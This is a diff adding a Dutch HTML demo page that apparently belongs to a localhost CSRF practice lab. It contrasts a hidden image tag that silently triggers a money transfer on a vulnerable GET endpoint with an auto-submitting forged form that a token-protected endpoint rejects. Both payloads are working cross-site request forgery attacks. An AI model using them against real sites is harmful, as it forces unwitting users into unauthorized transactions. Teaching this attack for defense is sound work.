@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="nl">
+<head>
+    <meta charset="utf-8">
+    <title>Nagemaakte aanvalspagina</title>
+    <style>
+        body { font: 15px/1.5 Arial, sans-serif; max-width: 640px; margin: 40px auto; padding: 0 16px; }
+        code { background: #f0f2f4; padding: 2px 5px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h1>Nagemaakte aanvalspagina</h1>
+
+    <h2>Aanval 1: het kwetsbare GET-endpoint</h2>
+    <p>
+        Deze pagina bevat een onzichtbare <code>&lt;img&gt;</code>-tag die verwijst naar
+        <code>vulnerable-transfer.php</code>. De browser haalt "afbeeldingen" altijd automatisch op,
+        zonder dat jij ergens op klikt. Omdat dat bestand een gewone GET-request accepteert en geen
+        CSRF-token controleert, wordt het geld écht overgemaakt zodra deze pagina laadt.
+    </p>
+    <!-- De echte aanval: gewoon een afbeelding die toevallig een geldoverboeking triggert. -->
+    <img src="http://localhost/Oefenen/crud/csrf/tricky/vulnerable-transfer.php?from=1&to=2&amount=25"
+         alt="" width="1" height="1">
+    <p>Ga terug naar <a href="index.php">het overzicht</a> en zie dat het saldo is veranderd.</p>
+
+    <h2>Aanval 2: het veilige POST-endpoint (mislukt expres)</h2>
+    <p>
+        Deze pagina probeert hetzelfde te doen bij <code>secure-transfer.php</code>, maar kent het
+        CSRF-token niet dat in jouw sessie op de echte site staat. Dit formulier wordt met
+        <strong>403 Forbidden</strong> geweigerd.
+    </p>
+    <form id="forged" action="http://localhost/Oefenen/crud/csrf/tricky/secure-transfer.php" method="post">
+        <input type="hidden" name="from" value="1">
+        <input type="hidden" name="to" value="2">
+        <input type="hidden" name="amount" value="25">
+        <!-- Bewust GEEN csrf_token veld: de aanvaller kent het token niet. -->
+    </form>
+    <script>
+        document.getElementById('forged').submit();
+    </script>
+</body>
+</html>
